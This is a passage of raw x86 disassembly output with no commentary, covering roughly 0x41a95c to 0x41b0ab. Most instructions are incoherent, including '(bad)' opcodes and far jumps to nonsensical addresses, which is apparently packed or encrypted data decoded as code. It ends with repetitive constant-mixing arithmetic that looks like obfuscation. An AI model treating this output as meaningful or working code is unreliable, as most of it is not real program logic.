  41a95c:	mov    ds:0x3731add3,eax
  41a961:	cwde   
  41a962:	add    BYTE PTR [ebx+0x6c2601da],dl
  41a968:	leave  
  41a969:	add    eax,0x1bce96d2
  41a96e:	fcom   st(4)
  41a970:	not    edx
  41a972:	js     0x41a92f
  41a974:	sbb    ah,BYTE PTR ds:0xcb3eddee
  41a97a:	ret    0xcf0
  41a97d:	or     al,0xa5
  41a97f:	test   DWORD PTR ds:0xa590a3b5,ebx
  41a985:	(bad)  
  41a987:	sbb    al,0xfc
  41a989:	push   cs
  41a98a:	scas   al,BYTE PTR es:[edi]
  41a98b:	mov    ebp,0x1c80e60d
  41a990:	(bad)  
  41a991:	scas   eax,DWORD PTR es:[edi]
  41a992:	in     eax,0xf9
  41a994:	rsqrtps xmm0,xmm4
  41a997:	leave  
  41a998:	in     al,0xed
  41a99a:	adc    BYTE PTR [ebp-0x5c],bh
  41a99d:	or     ah,BYTE PTR [edi+0x44b1dfb7]
  41a9a3:	pop    esi
  41a9a4:	add    al,0x51
  41a9a6:	ins    BYTE PTR es:[edi],dx
  41a9a7:	mov    bl,0x8
  41a9a9:	adc    cl,ch
  41a9ab:	cwde   
  41a9ac:	jp     0x41a9ea
  41a9ae:	pop    edx
  41a9af:	and    eax,0x1edc71df
  41a9b4:	lods   eax,DWORD PTR ds:[esi]
  41a9b5:	lahf   
  41a9b6:	mov    BYTE PTR [edx-0x2f5bee85],dh
  41a9bc:	fwait
  41a9bd:	xor    DWORD PTR [edi],0xf
  41a9c0:	and    al,BYTE PTR [ebx+0x7f]
  41a9c3:	inc    eax
  41a9c4:	push   ebx
  41a9c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a9c6:	xor    edi,DWORD PTR [edi]
  41a9c8:	out    dx,eax
  41a9c9:	pop    ebx
  41a9ca:	sub    esi,esp
  41a9cc:	add    BYTE PTR ds:0xc996b9b2,ah
  41a9d2:	ds out dx,eax
  41a9d4:	seto   BYTE PTR [ebp-0x78]
  41a9d8:	jns    0x41aa4f
  41a9da:	push   ss
  41a9db:	pop    ds
  41a9dc:	xlat   BYTE PTR ds:[ebx]
  41a9dd:	xchg   ebx,eax
  41a9de:	sub    BYTE PTR [ebx+0x74],bl
  41a9e1:	mov    cl,0x16
  41a9e3:	jb     0x41aa38
  41a9e5:	repz sbb eax,0x73a3cbe1
  41a9eb:	xchg   ecx,eax
  41a9ec:	jl     0x41a9a9
  41a9ee:	or     eax,0xa6451b84
  41a9f3:	lods   eax,DWORD PTR ds:[esi]
  41a9f4:	mov    esp,0x116cf44b
  41a9f9:	xor    ebx,DWORD PTR [edi-0x55]
  41a9fc:	loop   0x41aa34
  41a9fe:	ret    
  41a9ff:	(bad)  
  41aa00:	shl    dl,1
  41aa02:	mov    eax,ds:0x921fa5ce
  41aa07:	and    DWORD PTR [ebx+ebp*4],ecx
  41aa0a:	sbb    ah,bl
  41aa0c:	mov    cl,0x53
  41aa0e:	sub    eax,0x5e26fb1e
  41aa13:	ds jecxz 0x41a9fe
  41aa16:	push   ebp
  41aa17:	inc    edx
  41aa18:	loopne 0x41aa86
  41aa1a:	(bad)  
  41aa1b:	outs   dx,BYTE PTR ds:[esi]
  41aa1c:	and    BYTE PTR [esi-0xc23153f],dl
  41aa22:	adc    bl,cl
  41aa24:	xchg   ebp,eax
  41aa25:	push   ds
  41aa26:	je     0x41a9b1
  41aa28:	and    ebx,DWORD PTR [ebx-0x47]
  41aa2b:	mov    ds:0x3768d4ee,al
  41aa30:	mov    ecx,0xfa0ac0af
  41aa35:	fidiv  WORD PTR [esi+0x3e]
  41aa38:	cli    
  41aa39:	stos   DWORD PTR es:[edi],eax
  41aa3a:	lock mov ah,0x22
  41aa3d:	or     BYTE PTR [ebp-0x37],ah
  41aa40:	xchg   ebp,eax
  41aa41:	dec    ebp
  41aa42:	out    0xa9,al
  41aa44:	push   cs
  41aa45:	jns    0x41aa25
  41aa47:	push   0x8b0a0398
  41aa4c:	jle    0x41aa5e
  41aa4e:	cmp    BYTE PTR fs:[esi+0x4d],al
  41aa52:	out    dx,al
  41aa53:	ss pop esp
  41aa55:	mov    al,ds:0xe486d393
  41aa5a:	mov    edx,0xfee7af5c
  41aa5f:	dec    edx
  41aa60:	sbb    eax,ebp
  41aa62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aa63:	outs   dx,DWORD PTR ds:[esi]
  41aa64:	or     eax,DWORD PTR [ebx-0x4b969bd1]
  41aa6a:	sar    BYTE PTR [esi+0x7b],1
  41aa6d:	lock fisubr WORD PTR es:[edx]
  41aa71:	pushf  
  41aa72:	out    dx,eax
  41aa73:	lods   al,BYTE PTR ds:[esi]
  41aa74:	xor    al,0xd9
  41aa76:	push   ebp
  41aa77:	cmp    bl,BYTE PTR [eax]
  41aa79:	sti    
  41aa7a:	pop    esp
  41aa7b:	xchg   esi,eax
  41aa7c:	pop    ds
  41aa7d:	xchg   esp,eax
  41aa7e:	es js  0x41aa57
  41aa81:	aas    
  41aa82:	xchg   BYTE PTR [esi+eax*4-0x3c],dl
  41aa86:	inc    ebx
  41aa87:	data16 ds (bad) 
  41aa8b:	pop    DWORD PTR [esi+edi*2+0x509f338]
  41aa92:	out    dx,eax
  41aa93:	in     eax,0x17
  41aa95:	mov    bl,0x3e
  41aa97:	lock lea ecx,[ebp-0x33]
  41aa9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aa9c:	jbe    0x41aa40
  41aa9e:	ret    0xf5c9
  41aaa1:	lods   eax,DWORD PTR ds:[esi]
  41aaa2:	jecxz  0x41aa4b
  41aaa4:	ins    BYTE PTR es:[edi],dx
  41aaa5:	ss out dx,al
  41aaa7:	jmp    0x41aa42
  41aaa9:	push   esi
  41aaaa:	push   es
  41aaab:	or     al,0xb
  41aaad:	sbb    esi,ebx
  41aaaf:	out    0x6c,eax
  41aab1:	jl     0x41aaa7
  41aab3:	stos   DWORD PTR es:[edi],eax
  41aab4:	pop    ecx
  41aab5:	sub    DWORD PTR [eax-0x7c],ecx
  41aab8:	xor    al,0x66
  41aaba:	sbb    eax,0xb2ce6e59
  41aabf:	dec    ebx
  41aac0:	adc    eax,0xda648610
  41aac5:	mov    ds:0x4bd20058,al
  41aaca:	stos   BYTE PTR es:[edi],al
  41aacb:	or     DWORD PTR [esi+eiz*1-0x4a997076],edi
  41aad2:	test   al,0x61
  41aad4:	icebp  
  41aad5:	pop    esi
  41aad6:	mov    dh,0x96
  41aad8:	push   eax
  41aad9:	mov    dl,0xdb
  41aadb:	or     al,0x28
  41aadd:	mov    ah,0x11
  41aadf:	hlt    
  41aae0:	inc    eax
  41aae1:	mov    al,ds:0x3a728280
  41aae6:	pop    ecx
  41aae7:	jne    0x41ab08
  41aae9:	xor    al,cl
  41aaeb:	das    
  41aaec:	pop    esi
  41aaed:	iret   
  41aaee:	popa   
  41aaef:	inc    eax
  41aaf0:	int    0xb6
  41aaf2:	test   al,0x1c
  41aaf4:	mov    ecx,0x5d6c922f
  41aaf9:	and    eax,0x5cf52ff6
  41aafe:	mov    ecx,edx
  41ab00:	arpl   WORD PTR [esi],ax
  41ab02:	stos   DWORD PTR es:[edi],eax
  41ab03:	pushf  
  41ab04:	test   eax,0x9e9d7587
  41ab09:	or     al,0x80
  41ab0b:	add    DWORD PTR [edx+0x50e6c8dc],0xf637d2ff
  41ab15:	xchg   DWORD PTR ds:0xe3454a27,edi
  41ab1b:	ss dec edi
  41ab1d:	or     cl,BYTE PTR [ecx+0x7f22ce00]
  41ab23:	scas   eax,DWORD PTR es:[edi]
  41ab24:	push   0xffffffa0
  41ab26:	scas   eax,DWORD PTR es:[edi]
  41ab27:	push   0xd79d290
  41ab2c:	out    dx,eax
  41ab2d:	dec    ecx
  41ab2e:	stos   DWORD PTR es:[edi],eax
  41ab2f:	ja     0x41ab89
  41ab31:	push   es
  41ab32:	adc    eax,0xb74e85f1
  41ab37:	test   eax,0xc98dd757
  41ab3c:	pop    edi
  41ab3d:	out    0xb,al
  41ab3f:	retf   
  41ab40:	pusha  
  41ab41:	xor    al,BYTE PTR [ebx+edi*1-0x3f]
  41ab45:	hlt    
  41ab46:	in     eax,dx
  41ab47:	out    0x3a,eax
  41ab49:	data16 clc 
  41ab4b:	sbb    eax,0x1e4bc780
  41ab50:	sbb    ecx,esp
  41ab52:	mov    dl,BYTE PTR ds:0xe432cf15
  41ab58:	(bad)  
  41ab59:	push   esp
  41ab5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ab5b:	out    0x68,eax
  41ab5d:	jbe    0x41abb9
  41ab5f:	pusha  
  41ab60:	lods   al,BYTE PTR ds:[esi]
  41ab61:	inc    eax
  41ab62:	xchg   ecx,eax
  41ab63:	or     edi,ebx
  41ab65:	ss dec edx
  41ab67:	or     al,0x17
  41ab69:	clc    
  41ab6a:	retf   
  41ab6b:	mov    ds:0xa66a9902,al
  41ab70:	rcr    BYTE PTR [edi+edi*8-0x51107db2],0xb4
  41ab78:	mov    esi,0xf31bd8ce
  41ab7d:	and    BYTE PTR [eax],dh
  41ab7f:	retf   0x23cf
  41ab82:	pushf  
  41ab83:	not    BYTE PTR [eax]
  41ab85:	sub    BYTE PTR [eax-0x80],dl
  41ab88:	js     0x41ab49
  41ab8a:	retf   0x9b26
  41ab8d:	aam    0xd0
  41ab8f:	jnp    0x41ab4d
  41ab91:	pop    ebx
  41ab92:	jmp    0x9db2fef2
  41ab97:	and    DWORD PTR [edi],ebp
  41ab99:	jb     0x41ab77
  41ab9b:	xchg   esi,eax
  41ab9c:	idiv   BYTE PTR [ebx-0x10]
  41ab9f:	mov    edx,DWORD PTR [ebx+0x7b]
  41aba2:	sbb    esp,eax
  41aba4:	push   ebp
  41aba5:	jmp    0x41ac00
  41aba7:	xor    BYTE PTR [eax],al
  41aba9:	nop
  41abaa:	les    esp,FWORD PTR [eax+0xdf1ab61]
  41abb0:	cmp    BYTE PTR [esi],dl
  41abb2:	and    ebp,DWORD PTR [ebp-0x2f98a244]
  41abb8:	in     al,0xc7
  41abba:	mov    al,0xf7
  41abbc:	icebp  
  41abbd:	sar    DWORD PTR [edx+ebp*1-0x19b41da5],1
  41abc4:	stos   BYTE PTR es:[edi],al
  41abc5:	jp     0x41abf9
  41abc7:	enter  0x726b,0x96
  41abcb:	sbb    al,bl
  41abcd:	pop    es
  41abce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41abcf:	xchg   edi,eax
  41abd0:	jecxz  0x41ac27
  41abd2:	mov    dh,0xe8
  41abd4:	ja     0x41ac0c
  41abd6:	jmp    0x41abd9
  41abd8:	sub    esp,DWORD PTR ds:0xf5a2146c
  41abde:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41abdf:	aaa    
  41abe0:	adc    dl,BYTE PTR [ecx-0x24b3c5c0]
  41abe6:	mov    bl,0xc0
  41abe8:	outs   dx,BYTE PTR ds:[esi]
  41abe9:	or     BYTE PTR [esi+0x65],bh
  41abec:	out    dx,al
  41abed:	xchg   esp,eax
  41abee:	inc    eax
  41abef:	push   cs
  41abf0:	push   esi
  41abf1:	xor    al,0xab
  41abf3:	std    
  41abf4:	sub    al,0x8e
  41abf6:	jp     0x41ac50
  41abf8:	mov    bl,0xa
  41abfa:	or     al,0xc5
  41abfc:	or     al,0x6c
  41abfe:	popf   
  41abff:	bound  edi,QWORD PTR [edi+0x6]
  41ac02:	ror    ebp,cl
  41ac04:	data16 fnstcw WORD PTR [ecx+0x2c7e4c88]
  41ac0b:	sbb    al,0x70
  41ac0d:	jbe    0x41abbe
  41ac0f:	(bad)  
  41ac10:	fld    DWORD PTR [esi-0x7]
  41ac13:	pushf  
  41ac14:	test   eax,0x88e09bc9
  41ac19:	cmp    al,0x7b
  41ac1b:	mov    WORD PTR [edi-0x69b62ebd],es
  41ac21:	lods   eax,DWORD PTR ds:[esi]
  41ac22:	push   esi
  41ac23:	loope  0x41abf2
  41ac25:	mov    cl,0xc9
  41ac27:	mov    ebp,0xa4c8d52c
  41ac2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ac2d:	inc    eax
  41ac2e:	js     0x41ac80
  41ac30:	pop    edi
  41ac31:	push   0xffffff8c
  41ac33:	jmp    0x41ac8b
  41ac35:	mov    esp,0x3705ffc9
  41ac3a:	sbb    dh,dl
  41ac3c:	push   DWORD PTR [ebx]
  41ac3e:	fs and al,0x79
  41ac41:	cmp    edx,DWORD PTR [esi]
  41ac43:	ss mov esi,0x7e6508bd
  41ac49:	fld1   
  41ac4b:	xchg   edi,eax
  41ac4c:	cmp    edi,esp
  41ac4e:	in     eax,dx
  41ac4f:	jo     0x41accd
  41ac51:	mov    cl,0xcc
  41ac53:	xchg   ecx,eax
  41ac54:	pop    eax
  41ac55:	fiadd  DWORD PTR [ebx-0x40]
  41ac58:	inc    edx
  41ac59:	and    eax,0xd5267b8f
  41ac5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ac5f:	dec    ecx
  41ac60:	push   ebx
  41ac61:	ret    
  41ac62:	dec    ebx
  41ac63:	add    edi,DWORD PTR [esi-0x74c1e0d9]
  41ac69:	mov    es,WORD PTR [ebp+0x49]
  41ac6c:	dec    eax
  41ac6d:	or     BYTE PTR [ebp+ebx*4-0x1c],bl
  41ac71:	outs   dx,DWORD PTR ds:[esi]
  41ac72:	cmp    al,0x9b
  41ac74:	pop    ecx
  41ac75:	jbe    0x41acec
  41ac77:	jp     0x41ac35
  41ac79:	addr16 sub ch,dh
  41ac7c:	sub    al,0xb4
  41ac7e:	lock jle 0x41aca8
  41ac81:	lea    edi,[ebx-0x4e]
  41ac84:	adc    ah,BYTE PTR [eax]
  41ac86:	(bad)  
  41ac87:	fcomp  DWORD PTR [esi-0x5b]
  41ac8a:	xchg   DWORD PTR ds:0x28c4859d,eax
  41ac90:	aad    0xd1
  41ac92:	scas   eax,DWORD PTR es:[edi]
  41ac93:	xchg   esp,eax
  41ac94:	aaa    
  41ac95:	stos   BYTE PTR es:[edi],al
  41ac96:	mul    ebx
  41ac98:	add    bh,BYTE PTR [ebp+0x48]
  41ac9b:	fild   QWORD PTR [edx+0x56697f94]
  41aca1:	mov    ebx,0xd2a5c925
  41aca6:	mov    ebx,0x4f0bb379
  41acab:	in     eax,0xfa
  41acad:	rcl    eax,cl
  41acaf:	mov    esi,0xbebcc86d
  41acb4:	repnz dec edx
  41acb6:	cld    
  41acb7:	pop    ebp
  41acb8:	shr    DWORD PTR [eax-0x6aae2e11],0x8a
  41acbf:	ins    BYTE PTR es:[edi],dx
  41acc0:	xchg   edx,eax
  41acc1:	dec    ecx
  41acc2:	aad    0xcc
  41acc4:	idiv   BYTE PTR [ecx+edi*2]
  41acc7:	sar    edi,0x23
  41acca:	les    edi,FWORD PTR [esi-0x13]
  41accd:	mov    BYTE PTR [eax],bl
  41accf:	or     ebx,DWORD PTR [edx+0x4be66252]
  41acd5:	xor    al,0x51
  41acd7:	fwait
  41acd8:	xor    dh,BYTE PTR [ebx+eax*2+0x357cb680]
  41acdf:	(bad)  
  41ace0:	pop    ebp
  41ace1:	mov    dl,0x48
  41ace3:	mov    esp,0x268ab8b8
  41ace8:	repnz mov bh,0x9f
  41aceb:	(bad)  
  41acec:	(bad)  
  41aced:	in     eax,dx
  41acee:	imul   edi,DWORD PTR [esi+0x3db0b75b],0x5f
  41acf5:	add    al,0x79
  41acf7:	std    
  41acf8:	leave  
  41acf9:	jmp    0xa34d5ec2
  41acfe:	sbb    BYTE PTR [edi-0x57],bl
  41ad01:	in     al,dx
  41ad02:	test   BYTE PTR [eax+edi*4-0x515f3d0],ah
  41ad09:	xor    ebp,DWORD PTR [esi-0x7b]
  41ad0c:	mov    esp,0x1398a7ef
  41ad11:	mov    ds:0xb54bd566,al
  41ad16:	mov    al,0xb8
  41ad18:	fcmovb st,st(2)
  41ad1a:	lea    ebx,[eax]
  41ad1c:	add    BYTE PTR [ebp+0x796880a7],0x9
  41ad23:	mov    ecx,?
  41ad25:	dec    ebx
  41ad26:	adc    DWORD PTR [edx-0x2eb54d9d],esi
  41ad2c:	inc    eax
  41ad2d:	cli    
  41ad2e:	ss out dx,al
  41ad30:	inc    ecx
  41ad31:	sub    ah,BYTE PTR [esi+0x6b1c558]
  41ad37:	dec    ecx
  41ad38:	inc    edx
  41ad39:	push   0x6b
  41ad3b:	xchg   ebp,eax
  41ad3c:	and    eax,esi
  41ad3e:	(bad)  
  41ad3f:	xlat   BYTE PTR ds:[ebx]
  41ad40:	push   es
  41ad41:	jp     0x41ad35
  41ad43:	xor    esi,DWORD PTR [edi+esi*8+0xc]
  41ad47:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ad48:	call   0x497ebc45
  41ad4d:	scas   al,BYTE PTR es:[edi]
  41ad4e:	xor    ebx,esi
  41ad50:	icebp  
  41ad51:	out    dx,al
  41ad52:	fcom   QWORD PTR [ecx+edi*1]
  41ad55:	jnp    0x41adcd
  41ad57:	cld    
  41ad58:	push   ds
  41ad59:	mov    edx,0x4f730e4f
  41ad5e:	add    DWORD PTR [esi],0xfffffff4
  41ad61:	cli    
  41ad62:	mov    al,0x77
  41ad64:	outs   dx,BYTE PTR ds:[esi]
  41ad65:	xrelease mov BYTE PTR [ebx-0x33a4df80],dh
  41ad6c:	arpl   WORD PTR gs:[eax+0x26],sp
  41ad70:	push   ebx
  41ad71:	stc    
  41ad72:	rcl    DWORD PTR [ebx],1
  41ad74:	ins    DWORD PTR es:[edi],dx
  41ad75:	mov    edi,0x5c0d467a
  41ad7a:	sbb    DWORD PTR [ecx+0x3e],edi
  41ad7d:	fistp  QWORD PTR [edx]
  41ad7f:	aas    
  41ad80:	sub    esi,esi
  41ad82:	shr    bh,1
  41ad84:	jecxz  0x41ad7c
  41ad86:	jmp    0x41ad9f
  41ad88:	mov    ds:0x6e812970,al
  41ad8d:	mov    BYTE PTR [ebp-0x35],bl
  41ad90:	push   0x1a
  41ad92:	sbb    eax,0xc886049f
  41ad97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ad98:	add    eax,0x43ba2fc1
  41ad9d:	mov    bl,0x62
  41ad9f:	sti    
  41ada0:	and    cl,BYTE PTR ds:[eax]
  41ada3:	gs (bad) 
  41ada6:	dec    ebp
  41ada7:	imul   edx,edi,0xffffffba
  41adaa:	ins    DWORD PTR es:[edi],dx
  41adab:	ds jp  0x41ad57
  41adae:	cld    
  41adaf:	and    al,0xcd
  41adb1:	rcr    BYTE PTR [ebx+0x60df921c],0x8b
  41adb8:	inc    esi
  41adb9:	dec    edx
  41adba:	into   
  41adbb:	dec    edi
  41adbc:	das    
  41adbd:	sub    eax,0x62c8be02
  41adc2:	xchg   ebx,eax
  41adc3:	out    0xac,al
  41adc5:	dec    edx
  41adc6:	cmp    ah,BYTE PTR [edi+edx*8+0x1fbba79]
  41adcd:	push   es
  41adce:	shl    DWORD PTR [edi],0x6b
  41add1:	cmp    BYTE PTR [esp+edx*1+0x4987de59],bh
  41add8:	sahf   
  41add9:	shl    DWORD PTR [eax],0x73
  41addc:	cli    
  41addd:	pop    ebp
  41adde:	sbb    bh,dh
  41ade0:	call   0x12a2:0xef410a76
  41ade7:	sar    esi,0x1f
  41adea:	pop    esp
  41adeb:	sahf   
  41adec:	jg     0x41ada1
  41adee:	jae    0x41ade9
  41adf0:	jno    0x41ae21
  41adf2:	sbb    DWORD PTR [ebp+0x2],esi
  41adf5:	inc    esp
  41adf6:	sub    al,0xde
  41adf8:	mov    dl,0x8f
  41adfa:	dec    ebp
  41adfb:	aaa    
  41adfc:	mov    esp,0x93e77f42
  41ae01:	stos   BYTE PTR es:[edi],al
  41ae02:	aam    0x4a
  41ae04:	push   cs
  41ae05:	xor    eax,0x970b6660
  41ae0a:	cmp    esp,DWORD PTR [esi+eax*2-0xf45fe7a]
  41ae11:	cmp    eax,DWORD PTR [edi-0x731bdc58]
  41ae17:	dec    eax
  41ae18:	or     dl,BYTE PTR [ecx+0x34a0d396]
  41ae1e:	(bad)  
  41ae20:	jmp    0x3cf7:0xf3476117
  41ae27:	cli    
  41ae28:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ae29:	jae    0x41ae47
  41ae2b:	cmp    ah,BYTE PTR [esi-0x3]
  41ae2e:	mul    cl
  41ae30:	pop    ss
  41ae31:	cdq    
  41ae32:	in     eax,dx
  41ae33:	xor    al,BYTE PTR ds:0x7145ae41
  41ae39:	sti    
  41ae3a:	inc    DWORD PTR [eax]
  41ae3c:	and    al,0x70
  41ae3e:	push   ebx
  41ae3f:	mov    bl,dl
  41ae41:	push   esi
  41ae42:	lods   eax,DWORD PTR ds:[esi]
  41ae43:	adc    eax,0xb038a7a4
  41ae48:	leave  
  41ae49:	xlat   BYTE PTR ds:[ebx]
  41ae4a:	fucom  st(0)
  41ae4c:	push   ds
  41ae4d:	cs pop edx
  41ae4f:	push   esp
  41ae50:	jge    0x41adf0
  41ae52:	mov    edi,0xd922a81d
  41ae57:	mov    ebp,0x614ba947
  41ae5c:	fcomp  QWORD PTR [edx]
  41ae5e:	ror    ecx,1
  41ae60:	jmp    0x2321e45b
  41ae65:	xor    eax,0x91bf6335
  41ae6a:	mov    ah,0x51
  41ae6c:	ss ss mov esi,0x1b2af1fb
  41ae73:	sbb    eax,DWORD PTR [eax+0x6658b20e]
  41ae79:	stc    
  41ae7a:	jne    0x41aef1
  41ae7c:	test   BYTE PTR [ebp+0x7a],dl
  41ae7f:	retf   
  41ae80:	out    dx,al
  41ae81:	xor    al,0x92
  41ae83:	dec    eax
  41ae84:	outs   dx,DWORD PTR ds:[esi]
  41ae85:	loopne 0x41ae67
  41ae87:	or     BYTE PTR fs:[ebx+ecx*2],0x29
  41ae8c:	xor    BYTE PTR [ebp+0x634dd4ac],bl
  41ae92:	cmc    
  41ae93:	add    bh,al
  41ae95:	and    bh,dh
  41ae97:	and    BYTE PTR [edx+edi*2+0x3c],ah
  41ae9b:	inc    edi
  41ae9c:	mov    al,0x9a
  41ae9e:	jno    0x41aec3
  41aea0:	adc    eax,0xf6ee1e98
  41aea5:	(bad)  
  41aea6:	xor    dh,ah
  41aea8:	enter  0x2bd9,0x79
  41aeac:	(bad)  
  41aead:	loope  0x41aeff
  41aeaf:	stc    
  41aeb0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aeb1:	ins    BYTE PTR es:[edi],dx
  41aeb2:	cld    
  41aeb3:	or     al,0xa7
  41aeb5:	mov    al,ds:0xe1e62b73
  41aeba:	cmp    ebx,DWORD PTR ds:0xcf34a081
  41aec0:	xchg   edi,eax
  41aec1:	shl    DWORD PTR [ebp+0xd91c0bc],1
  41aec7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aec8:	bound  ebx,QWORD PTR [eax-0x1a526018]
  41aece:	xlat   BYTE PTR ds:[ebx]
  41aecf:	cmp    bh,BYTE PTR [ebx]
  41aed1:	sahf   
  41aed2:	loop   0x41ae65
  41aed4:	std    
  41aed5:	mov    eax,ds:0xa717ddde
  41aeda:	and    ecx,ebp
  41aedc:	mov    al,ds:0xe5c7dd27
  41aee1:	rol    DWORD PTR [edi],cl
  41aee3:	imul   eax,edx,0x50
  41aee6:	ja     0x41ae85
  41aee8:	dec    ebx
  41aee9:	adc    dh,BYTE PTR [ebp-0x4b2a9c7]
  41aeef:	xlat   BYTE PTR ds:[ebx]
  41aef0:	push   ebx
  41aef1:	nop
  41aef2:	mov    BYTE PTR [ecx+0x21],ch
  41aef5:	not    DWORD PTR [ebp+0x1b]
  41aef8:	dec    ecx
  41aef9:	jnp    0x41aece
  41aefb:	sbb    cl,ah
  41aefd:	rcr    BYTE PTR [ebx-0x6c166a36],0x50
  41af04:	imul   esp,eax,0x26
  41af07:	ror    DWORD PTR [edi+0x7e5c3db9],0x3c
  41af0e:	into   
  41af0f:	inc    edi
  41af10:	sahf   
  41af11:	retf   0x2794
  41af14:	pop    esi
  41af15:	mov    edi,0x466f00d9
  41af1a:	inc    edi
  41af1b:	stc    
  41af1c:	mov    bl,0x8f
  41af1e:	out    0x91,al
  41af20:	hlt    
  41af21:	test   DWORD PTR [edi-0x27f44eb4],0xc65369ce
  41af2b:	ins    DWORD PTR es:[edi],dx
  41af2c:	mov    edx,0x33572082
  41af31:	sahf   
  41af32:	fsub   DWORD PTR [ecx+0x24]
  41af35:	mov    ecx,0xf90fcba4
  41af3a:	shl    BYTE PTR [esi-0x21],1
  41af3d:	push   edx
  41af3e:	iret   
  41af3f:	dec    edx
  41af40:	aaa    
  41af41:	push   esp
  41af42:	adc    ecx,ecx
  41af44:	ror    BYTE PTR [ebx+0x34a1d832],cl
  41af4a:	stos   DWORD PTR es:[edi],eax
  41af4b:	fbld   TBYTE PTR [ebp*1-0x46fb90c5]
  41af52:	pshufw mm1,QWORD PTR [esi+0x40],0x5d
  41af57:	fcom   DWORD PTR [eax-0x1bb0cced]
  41af5d:	add    dl,BYTE PTR [edx+0x61]
  41af60:	arpl   WORD PTR [ebp-0x10],cx
  41af63:	test   DWORD PTR [edx+0x2e],esi
  41af66:	mov    ds:0x85054a33,eax
  41af6b:	les    esp,FWORD PTR [ebx]
  41af6d:	xchg   esi,ebx
  41af6f:	lahf   
  41af70:	gs xor eax,0x8e37a631
  41af76:	stc    
  41af77:	sahf   
  41af78:	arpl   WORD PTR [edi],bp
  41af7a:	test   eax,0xc02038c2
  41af7f:	es pop esi
  41af81:	call   0x3cd8f117
  41af86:	sar    DWORD PTR [edi+0x7348ae7e],1
  41af8c:	adc    eax,DWORD PTR [ecx+0x69307452]
  41af92:	cmp    eax,0xe1f117b9
  41af97:	outs   dx,DWORD PTR ds:[esi]
  41af98:	xor    BYTE PTR [edx],dh
  41af9a:	bound  ebx,QWORD PTR [eax]
  41af9c:	inc    edi
  41af9d:	inc    ecx
  41af9e:	mov    ah,0x68
  41afa0:	dec    eax
  41afa1:	lds    ebp,FWORD PTR [ebx-0x55e5e1c8]
  41afa7:	hlt    
  41afa8:	ins    BYTE PTR es:[edi],dx
  41afa9:	xor    BYTE PTR [esp+ebp*1+0x5843ec9],0xd5
  41afb1:	xchg   edi,eax
  41afb2:	out    dx,eax
  41afb3:	and    eax,0x7d8a8382
  41afb8:	jp     0x41b00c
  41afba:	test   BYTE PTR [ebx-0x19a9a257],0x19
  41afc1:	into   
  41afc2:	loopne 0x41af96
  41afc4:	xchg   DWORD PTR [eax+0x55f6042b],esp
  41afca:	sbb    dh,BYTE PTR [ebx-0x5e0c0865]
  41afd0:	mov    esi,0x11f094fa
  41afd5:	test   al,0xd4
  41afd7:	nop
  41afd8:	sbb    eax,0xf166e528
  41afdd:	jmp    0x28f36bbd
  41afe2:	mul    DWORD PTR [edx+0x1f]
  41afe5:	not    BYTE PTR [eax-0x43]
  41afe8:	leave  
  41afe9:	shl    BYTE PTR [esi-0x33],cl
  41afec:	(bad)  
  41afed:	mov    eax,0xe3d71673
  41aff2:	xchg   esp,eax
  41aff3:	push   edi
  41aff4:	repz dec esi
  41aff6:	test   eax,0x8f955e86
  41affc:	aaa    
  41affd:	sbb    al,0xb7
  41afff:	mov    ds:0xe0c1d1aa,al
  41b004:	loopne 0x41b018
  41b006:	adc    esi,edi
  41b008:	jno    0x41b044
  41b00a:	jge    0x41b085
  41b00c:	inc    ecx
  41b00d:	xor    BYTE PTR [edi+0x5511d611],ah
  41b013:	add    al,0xc1
  41b015:	into   
  41b016:	mov    bh,0x16
  41b018:	into   
  41b019:	dec    eax
  41b01a:	jecxz  0x41b076
  41b01c:	cmp    BYTE PTR [eax+0x1c],al
  41b01f:	dec    esp
  41b020:	es mov ebp,0x8796e73b
  41b026:	ret    0xc80
  41b029:	adc    DWORD PTR [ebp+0x1eb0a1b6],esi
  41b02f:	in     al,0x7b
  41b031:	inc    edx
  41b032:	shl    DWORD PTR [edi+0x168cf3af],cl
  41b038:	mov    bh,0x76
  41b03a:	lds    edx,FWORD PTR [edi+0x20fd2a7e]
  41b040:	int3   
  41b041:	cli    
  41b042:	test   al,0x47
  41b044:	jmp    0x3905:0xbafc401d
  41b04b:	sahf   
  41b04c:	fs mov ch,0xba
  41b04f:	das    
  41b050:	mov    edx,DWORD PTR [ebp-0x14]
  41b053:	mov    DWORD PTR [ebp+0x8],edx
  41b056:	jmp    0x41b0cb
  41b05b:	mov    edx,DWORD PTR [ebp+0x8]
  41b05e:	mov    ebx,DWORD PTR [ebp-0x8]
  41b061:	xor    edx,eax
  41b063:	xor    ebx,eax
  41b065:	sub    edx,ebx
  41b067:	sub    edx,esi
  41b069:	xor    edx,eax
  41b06b:	mov    DWORD PTR [ebp+0x8],edx
  41b06e:	mov    edx,DWORD PTR [ebp+0x8]
  41b071:	mov    ebx,DWORD PTR [ebp-0x58]
  41b074:	add    edx,0x5708f1
  41b07a:	imul   edx,ebx
  41b07d:	mov    DWORD PTR [ebp-0x58],edx
  41b080:	mov    edx,DWORD PTR [ebp+0x8]
  41b083:	mov    ebx,DWORD PTR [ebp-0x54]
  41b086:	add    edx,0x64f893
  41b08c:	or     edx,ebx
  41b08e:	mov    DWORD PTR [ebp-0x54],edx
  41b091:	mov    edx,DWORD PTR [ebp+0x8]
  41b094:	mov    ebx,DWORD PTR [ebp-0x50]
  41b097:	add    edx,ecx
  41b099:	xor    edx,ebx
  41b09b:	mov    DWORD PTR [ebp-0x50],edx
  41b09e:	mov    edx,DWORD PTR [ebp+0x8]
  41b0a1:	mov    ebx,DWORD PTR [ebp-0x4c]
  41b0a4:	add    edx,edi
  41b0a6:	and    edx,ebx
  41b0a8:	mov    DWORD PTR [ebp-0x4c],edx
  41b0ab:	mov    edx,DWORD PTR [ebp+0x8]
